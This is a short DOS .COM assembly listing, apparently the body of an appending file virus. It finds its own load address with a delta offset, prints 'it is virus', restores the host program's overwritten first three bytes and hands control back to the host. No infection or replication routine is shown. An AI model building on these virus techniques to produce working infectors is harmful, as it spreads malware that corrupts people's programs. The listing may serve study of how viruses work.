org 100h
call base
base:
  pop bp
  sub bp, base; bp 存储了实际加载和期望加载100h的差值，以后所有的地址引用都加上bp即可
  push bp
  call Display
  pop bp

;copy the overrided 3 bytes to infected code
mov di, bp
add di, $$;virus actual start
mov ax, [bp + InfectedFileSize]
sub di,  ax;di is prg start
mov bx, di; save prg start in bx
mov si, bp
add si, OverridedCode
mov cx, 3;count
memove:
mov al, [si]
mov  [di], al
inc di
inc si
dec cx
jnz memove

;give control to old code
jmp bx

Display:
        mov ax, bp
        add ax, Msg	
	mov	bp, ax			; ES:BP = str address
	mov	cx, 0bh			; CX = str len
	mov	ax, 1300h		; AH = 13,  AL = 01h
	mov	bx, 000ch		; page 0(BH = 0) black background red word (BL = 0Ch,highlight)
	mov	dl, 6
	mov dh, 3
	int	10h			; 
	ret

Msg: db "it is virus\n"
OverridedCode: db "000" ;3byte used save overrided bytes in infected code
InfectedFileSize dw 0x0000